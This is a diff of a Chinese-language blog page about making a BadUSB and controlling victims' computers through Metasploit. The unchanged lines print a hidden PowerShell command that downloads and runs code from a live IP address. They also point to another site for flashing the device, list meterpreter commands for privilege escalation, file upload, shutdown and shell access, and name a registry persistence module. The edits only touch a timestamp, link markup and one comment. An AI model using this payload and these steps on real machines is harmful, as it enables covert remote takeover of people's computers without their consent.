@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Sakura">
 <meta property="og:description" content="关于Badusb的制作和远控">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-02T14:12:05.681Z">
+<meta property="og:updated_time" content="2018-12-02T14:16:35.309Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Badusbmake">
 <meta name="twitter:description" content="关于Badusb的制作和远控">
@@ -337,11 +337,9 @@
 <h2 id="你获得的payload："><a href="#你获得的payload：" class="headerlink" title="你获得的payload："></a>你获得的payload：</h2><p><code>run</code>以后出现的那串命令<code>powershell.exe -nop -w hidden -c $l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(&#39;http://47.107.86.196:2333/nRhN1Qs&#39;);</code>、</p>
 <p>你可以在自己电脑按win+R运行这段命令</p>
 <h1 id="Badusb的制作"><a href="#Badusb的制作" class="headerlink" title="Badusb的制作"></a>Badusb的制作</h1><p>原理就是用这个“u盘”来模拟键盘的输入 从而运行一些奇怪的命令(手动滑稽)</p>
-<p>这个我就懒得写步骤了下面的链接自己看吧 就是把代码写入你的badusb里面</p>
-<font face="" size="4" color="red"><a href="http://blog.51cto.com/13620939/2074530" target="_blank" rel="noopener">这里是连接</a></font>
-
+<p>这个我就懒得写步骤了下面的链接自己看吧 就是把代码写入你的badusb里面<br><a href="http://blog.51cto.com/13620939/2074530" target="_blank" rel="noopener"><font face="" size="4" color="red">这里是连接</font></a></p>
 <p>买的badusb不同 写入的程序就不一样</p>
-<h1 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h1><p>有人运行你的payload后你就会收到一个session<br><code>sessions -i [会话的id]</code> 进入这个session 输入help可以知道你能做些什么<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> play  #play an audio file on target system, nothing written on disk.</span><br><span class="line"> getsystem  #Attempt to elevate your privilege to that of local system.</span><br><span class="line">upload  #Upload a file or directory</span><br><span class="line">shutdown  #huts down the remote computer</span><br><span class="line">shell #就是你的cmd！</span><br></pre></td></tr></table></figure></p>
+<h1 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h1><p>有人运行你的payload后你就会收到一个session<br><code>sessions -i [会话的id]</code> 进入这个session 输入help可以知道你能做些什么<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">play  #play an audio file on target system, nothing written on disk.</span><br><span class="line">getsystem  #Attempt to elevate your privilege to that of local system.</span><br><span class="line">upload  #Upload a file or directory</span><br><span class="line">shutdown  #huts down the remote computer</span><br><span class="line">shell #就类似你的cmd！</span><br></pre></td></tr></table></figure></p>
 <p>一般就是进入shell后<code>calc</code>弹个计算器来测试<br>有session后你基本什么都能干了 上面的这是一点点….</p>
 <h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>一般拿到session后电脑重启就没了 所以…</p>
 <p>msf权限维持模块：exploit/windows/local/registry_persistence</p>
